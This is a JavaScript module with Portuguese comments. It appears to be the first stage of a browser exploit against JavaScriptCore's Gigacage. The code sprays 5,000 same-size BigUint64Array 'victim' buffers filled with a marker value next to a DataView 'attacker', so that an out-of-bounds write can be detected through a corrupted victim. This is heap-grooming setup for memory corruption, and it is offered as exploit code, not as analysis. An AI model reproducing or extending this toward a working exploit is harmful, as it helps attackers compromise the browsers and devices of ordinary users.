
/**
 * MÓDULO 1: INSTANCE FACTORY (OOB WRITE EDITION)
 * Foco: Criar "Vítimas" adjacentes ao DataView na Gigacage.
 */

export const Factory = {
    buildTargets: function() {
        const instances = [];

        // =========================================================
        // O EXÉRCITO DE VÍTIMAS
        // Arrays de 64 bits inicializados com um valor falso.
        // Se o OOB Write funcionar, um deles será corrompido!
        // =========================================================
        window.victims = []; 
        
        for (let i = 0; i < 5000; i++) {
            let ab = new ArrayBuffer(256); // Mesmo size-class do alvo
            let view = new BigUint64Array(ab);
            view.fill(0xAAAAAAAAAAAAAAAAn); // Valor "Seguro"
            window.victims.push(view);
        }

        const safeBuild = (category, name, builderFunc) => {
            try {
                let obj = builderFunc();
                if (obj) instances.push({ category, name, instance: obj });
            } catch(e) {}
        };

        // O nosso Atacante (DataView)
        safeBuild("JSC", "DataView", () => new DataView(new ArrayBuffer(256)));

        return instances;
    }
};
